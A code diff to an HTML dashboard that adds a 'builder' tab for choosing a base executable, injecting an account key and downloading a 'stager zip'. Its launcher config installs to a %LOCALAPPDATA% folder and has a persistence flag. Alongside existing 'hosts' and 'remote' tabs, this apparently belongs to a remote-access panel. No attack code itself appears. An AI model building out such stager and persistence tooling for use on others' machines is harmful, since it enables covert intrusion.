@@ -14,6 +14,7 @@
       <a data-tab="overview" class="active">overview</a>
       <a data-tab="hosts">hosts</a>
       <a data-tab="remote">remote</a>
+      <a data-tab="builder">builder</a>
       <a data-tab="account">account</a>
       <a data-tab="settings">settings</a>
     </nav>
@@ -97,6 +98,41 @@
       </div>
     </section>
 
+    <section class="section" id="builder">
+      <h2>builder</h2>
+      <div class="sub">pick a base exe from the exe/ folder, inject a key, download the stager zip.</div>
+
+      <div class="toolbar">
+        <select id="b-base"><option value="">loading bases…</option></select>
+        <input id="b-key" placeholder="account key (leave blank to auto-generate)" style="min-width:320px">
+        <button class="ghost mini" id="b-build">build</button>
+        <button class="ghost mini" id="b-refresh">refresh</button>
+        <span class="grow"></span>
+        <span class="count" id="b-count">—</span>
+      </div>
+
+      <div class="tile" style="margin-bottom:14px">
+        <div class="k">launcher config (json)</div>
+        <textarea id="b-config" rows="8" style="font-family:var(--mono);font-size:12px;margin-top:8px;width:100%;background:#000;border:1px solid var(--line);border-radius:var(--r-md);color:var(--text);padding:13px 16px;outline:none;resize:vertical">{
+  "dest": "%LOCALAPPDATA%\\yc",
+  "exeName": "program.exe",
+  "keyFile": "key.json",
+  "args": [],
+  "persist": false
+}</textarea>
+        <div class="note">written into key.json inside the zip. base exe reads it at runtime.</div>
+      </div>
+
+      <div id="b-result"></div>
+
+      <div class="rows" style="margin-top:20px">
+        <div class="rowhead">
+          <span></span><span>base</span><span>size</span><span>built</span><span>actions</span>
+        </div>
+        <div id="b-rows"></div>
+      </div>
+    </section>
+
     <section class="section" id="account">
       <h2>account</h2>
       <div class="sub">identity and tokens.</div>
@@ -136,5 +172,6 @@
   </main>
 </div>
 <script src="/js/dashboard.js"></script>
+<script src="/js/builder.js"></script>
 </body>
 </html>
